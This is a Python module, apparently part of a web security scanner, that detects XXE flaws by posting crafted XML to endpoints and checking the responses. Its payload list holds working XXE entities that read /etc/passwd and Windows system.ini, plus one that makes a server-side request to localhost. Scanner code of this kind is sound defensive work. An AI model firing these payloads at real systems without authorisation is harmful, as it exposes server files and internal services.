"""XXE (XML External Entity) Detector."""
from .base_detector import BaseDetector, DetectorResult
from ..models.test_state import TestState
from ..models.finding import StandardFinding, CVSSInfo
from ..models.evidence import Evidence
from ..models.confidence import ConfidenceResult, ConfidenceLevel
from ..engine.request_engine import RequestEngine
from ..engine.auth_context import AuthContext
from ..engine.baseline import BaselineMeasurer

XXE_PAYLOADS = [
    ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
     ["root:", "daemon:", "nobody:"], "file_read"),
    ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><root>&xxe;</root>',
     ["[extensions]", "[drivers]", "mci"], "file_read_windows"),
    ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><root>&xxe;</root>',
     ["<!doctype", "<html"], "ssrf_via_xxe"),
]

XXE_ERROR_SIGS = [
    "xmlparseentityref", "entity", "dtd", "external entity",
    "xmlprocessinginstruction", "undefined entity", "disallowed",
]

class XXEDetector(BaseDetector):
    name = "XML External Entity (XXE)"
    category = "Injection"
    cwe = "CWE-611"
    owasp = "A05:2021 - Security Misconfiguration"

    def _run(self, endpoints, engine, auth_context, baseline_measurer):
        findings, tested, blocked = [], 0, 0
        # Only test endpoints that might accept XML
        testable = [ep for ep in endpoints if ep.accepts_xml or ep.content_type in ("application/xml", "text/xml")]
        # Also try POST endpoints that might accept XML
        if not testable:
            testable = [ep for ep in endpoints if ep.method == "POST"][:5]
        if not testable:
            return DetectorResult(test_state=TestState.NOT_APPLICABLE, details="No XML-accepting endpoints found")

        for ep in testable[:10]:
            tested += 1
            signals = []
            for payload, indicators, attack_type in XXE_PAYLOADS:
                resp = engine.post(ep.url, data=payload, headers={"Content-Type": "application/xml"})
                if resp.is_blocked: blocked += 1; continue
                if not resp.has_response: continue

                body_lower = resp.body.lower()
                matched = [ind for ind in indicators if ind.lower() in body_lower]
                if matched:
                    signals.append(f"entity_expanded: type={attack_type}, indicators={matched}")

                for sig in XXE_ERROR_SIGS:
                    if sig in body_lower:
                        signals.append(f"xxe_error_signature: {sig}")
                        break

            if signals:
                confidence = ConfidenceResult.from_signals(signals)
                if confidence.level in (ConfidenceLevel.MEDIUM, ConfidenceLevel.HIGH, ConfidenceLevel.CONFIRMED):
                    findings.append(StandardFinding(
                        vulnerability="XML External Entity (XXE)", category=self.category,
                        severity="HIGH", confidence=confidence, status=TestState.VULNERABLE,
                        endpoint=ep.url, method=ep.method,
                        cvss=CVSSInfo(score=7.5, vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", severity="HIGH"),
                        owasp=self.owasp, cwe=self.cwe,
                        remediation="Disable external entity processing in XML parsers. Use JSON instead of XML where possible.",
                        evidence=[Evidence(description=s) for s in signals],
                    ))

        vuln = [f for f in findings if f.status == TestState.VULNERABLE]
        state = TestState.VULNERABLE if vuln else (TestState.BLOCKED if blocked >= tested and tested > 0 else (TestState.PASS if tested > 0 else TestState.NOT_APPLICABLE))
        return DetectorResult(test_state=state, findings=findings, details=f"Tested {tested} endpoints. {len(vuln)} XXE found.",
                              endpoints_tested=tested, endpoints_blocked=blocked)
